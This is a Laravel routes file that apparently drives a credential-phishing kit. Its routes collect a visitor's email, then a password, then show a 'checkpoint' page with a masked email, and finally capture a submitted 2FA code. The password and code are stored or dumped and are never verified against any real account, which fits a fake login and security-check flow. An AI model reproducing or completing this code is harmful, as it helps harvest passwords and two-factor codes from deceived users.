<?php

use Illuminate\Support\Facades\Route;
use Carbon\Carbon;
use Illuminate\Http\Request;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return view('email');
});

Route::post('/checkMail', function (Request $request) {
    $email = $request->email;
    session(['email' => $email]);

    $email = session('email');
    // dd($email);
    return view('password');
});

Route::post('/change-password', function (Request $request) {
    $password = $request->password;
    session(['password' => $password]);
    $email = session('email');
    $parts = explode('@', $email);
    $emailNew = $email;
    if (count($parts) == 2) {
        $username = $parts[0];
        $domain = $parts[1];
        $visibleLength = 1;
        $hiddenLength = strlen($username) - (2 * $visibleLength);
        $hiddenPart = str_repeat('*', $hiddenLength);
        $hiddenUsername = substr($username, 0, $visibleLength) . $hiddenPart . substr($username, -$visibleLength);
        $emailNew = $hiddenUsername . '@' . $domain;
    }
    return view('checkpoint', compact('emailNew'));
});

Route::post('/check2fa', function (Request $request) {
    dd($request);
});
